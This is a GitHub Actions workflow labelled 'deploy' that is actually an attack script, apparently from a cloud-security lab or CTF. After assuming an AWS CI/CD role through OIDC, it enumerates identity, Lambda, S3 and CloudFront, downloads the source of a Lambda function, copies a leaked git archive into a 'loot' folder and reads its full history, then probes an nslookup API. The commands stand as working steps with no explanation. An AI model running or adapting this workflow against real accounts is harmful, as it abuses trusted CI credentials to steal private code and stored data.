name: deploy

on:
  push:
    branches:
      - corgi

jobs:
  aws:
    runs-on: ubuntu-latest

    permissions:
      id-token: write
      contents: read

    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Identity
        run: aws sts get-caller-identity

      - name: Lambda info
        run: |
          aws lambda get-function-configuration \
          --function-name nslookupv2

      - name: Download Lambda
        run: |
          mkdir lambda
          aws lambda get-function \
          --function-name nslookupv2 \
          --query 'Code.Location' \
          --output text > url

          curl -s $(cat url) -o lambda.zip
          unzip lambda.zip -d lambda

          cat lambda/lambda_function.py

      - name: S3 buckets
        run: |
          aws s3 ls
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/

      - name: Download leaked git
        run: |
          mkdir loot
          aws s3 cp \
          s3://platform-bucket-009661764077-us-east-1/dotgit.zip \
          loot/dotgit.zip

          unzip -q loot/dotgit.zip -d loot

          cd loot/dotgit
          git log --all

      - name: CloudFront
        run: |
          aws cloudfront list-distributions

      - name: API test
        run: |
          curl -X POST \
          https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
          -H "Content-Type: application/json" \
          -d '{"domain":"example.com"}'
